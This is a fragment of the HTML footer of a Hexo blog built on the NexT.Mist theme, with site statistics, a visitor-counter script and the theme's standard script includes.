      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">Symbols count total: </span>
    <span title="Symbols count total">1.3m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">Reading time total &asymp;</span>
    <span title="Reading time total">19:07</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
